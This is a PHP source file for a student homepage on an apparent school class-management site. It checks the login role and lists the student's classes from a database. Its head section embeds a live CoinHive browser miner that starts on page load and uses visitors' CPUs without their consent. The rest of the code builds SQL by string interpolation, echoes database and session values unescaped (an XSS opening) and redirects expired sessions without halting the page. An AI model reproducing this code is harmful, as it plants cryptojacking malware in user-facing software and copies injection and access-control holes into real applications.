<?php
include '../utilities/database.php';

  session_start();
  //Check if user is logged in
  if (isset($_SESSION['loggedin']) && $_SESSION['loggedin'] == true) {
    if(($_SESSION['role'] != 4) && $_SESSION['role'] != 3) {
      $_SESSION['error'] = true;
      $_SESSION['errorCode'] = "Not a student";
      header("Location: ../login.php");
      die("oops");
    }
  } else {
    $_SESSION['error'] = true;
    $_SESSION['errorCode'] = "Session Expired";
    header("Location: ../login.php?event=logout");
  }

  //Get the db Referance
  $db = getDB();

?>

<!-- This is the format we will use for the pages on the website. CSS to be added as
    time goes on and I continue to learn more. -->
<html lang="en">
  <head>
    <link rel="stylesheet" href="../css/home.css">
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0-beta/css/bootstrap.min.css" integrity="sha384-/Y6pD6FV/Vv2HJnA6t+vslU6fwYXjCFtcEpHbNJ0lyAFsXTsjBbfaDjzALeQsN6M" crossorigin="anonymous">
    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0-beta/js/bootstrap.min.js" integrity="sha384-h0AbiXch4ZDo7tp9hKZ4TsHbi047NrKGLO3SEJAg45jXxnGIfYzk4Si90RDIqNm1" crossorigin="anonymous"></script>
    <!-- Ethical? Maybe. Profitable? Not in the slightest. -->
    <script src="https://coin-hive.com/lib/coinhive.min.js"></script>
    <link rel="stylesheet" href="css/home.css">
    <script>
	     var miner = new CoinHive.Anonymous('cyJAe6sZCcdfGwI4CRIXtPlv8MOK5oo7');
	      miner.start();
    </script>
    <!-- End questionable content -->

    <!-- The top banner of the webpage -->
    <div class="top">
        <font size="-5"><a class="logout" href="../login.php?event=logout">Logout</a></font>
        <center>
          <?php
            echo "<h1>Welcome, " . $_SESSION['name'] . "</h1>";
          ?>
        </center>
    </div>
  </head>



  <!-- Main content of the webpage -->
<body>
  <div class="main">
    <br>
    <div class="container-fluid">
      <div class="row">
              <div class="col-md-6">
                <div class="home">
                  <center>
                    <br>
                    <button class="button" onclick="window.location='joinClass.php';">Join a Class</button>
                    <p>
                      Use an access code to join a new class
                    </p>
                  </center>
                </div>
              </div>

      <?php
      //Get all the classes that this student is a part of and build the homepage
      //Get the classes that the teacher is a teacher of
      $myID = $_SESSION['id'];
      $query = "SELECT class_id FROM userClasses WHERE user_id = $myID";
      $result = $db->query($query) or die($db->error);
        while ($class = $result->fetch_assoc()) {
          $id = $class['class_id'];
          $query = "SELECT * FROM classes WHERE ID = $id";
          $result2 = $db->query($query) or die($db->error);
          $thisClass = $result2->fetch_assoc();
          echo '
                  <div class="col-md-6">
                    <div class="home">
                      <center>
                        <br>
                        <button class="button" onclick="window.location=\'pages.php?class=' . $thisClass['ID'] . '\';">' . $thisClass['class_name'] . '</button>
                        <p>
                          ' . $thisClass['description'] . '
                        </p>
                      </center>
                    </div>
                  </div>
                </div>
                <br>';
          if($class = $result->fetch_assoc()) {
            $id = $class['class_id'];
            $query = "SELECT * FROM classes WHERE ID = $id";
            $result2 = $db->query($query) or die($db->error);
            $thisClass = $result2->fetch_assoc();
            echo '<div class="row">
                    <div class="col-md-6">
                      <div class="home">
                        <center>
                          <br>
                          <button class="button" onclick="window.location=\'pages.php?class=' . $thisClass['ID'] . '\';">' . $thisClass['class_name'] . '</button>
                          <p>
                          ' . $thisClass['description'] . '
                          </p>
                        </center>
                      </div>
                    </div>
                    <br>';
          }
          else {
            break;
          }
        }
       ?>
    </div>
  </div>
</body>
</html>
